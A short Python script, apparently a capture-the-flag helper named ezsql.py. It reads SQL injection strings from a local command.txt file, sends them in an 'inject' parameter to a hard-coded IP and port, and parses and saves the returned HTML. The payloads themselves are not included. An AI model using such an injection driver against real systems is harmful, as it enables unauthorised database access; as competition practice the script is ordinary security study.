# -*- utf-8 -*-
# @Time : 2020/1/8
# @Author : yaozh16
# @File : ezsql.py 
# @Software: PyCharm
# @Description: 

import requests
if __name__ == "__main__":
    with open("command.txt") as f:
        cmd = f.read()
    cmds = cmd.strip().split("\n")
    print(cmds)
    sess = requests.session()
    response = sess.get("http://202.112.51.130:28047/?inject={}".format(cmd.replace("\n","")))
    parts = response.text.split("<pre>")[1].split("</pre>")[0].strip("<hr>").split("<hr>")
    for i,part in enumerate(parts):
        print("{0} {1} {0}".format("*"*20,cmds[i].strip("\n")))
        iterms = part.strip("<br>").split("<br>")
        for iterm in iterms:
            print([iterm.replace("\n","").strip()])

    with open("response.html", 'w', encoding="utf8") as f:
        f.write(response.text)
        f.close()
    pass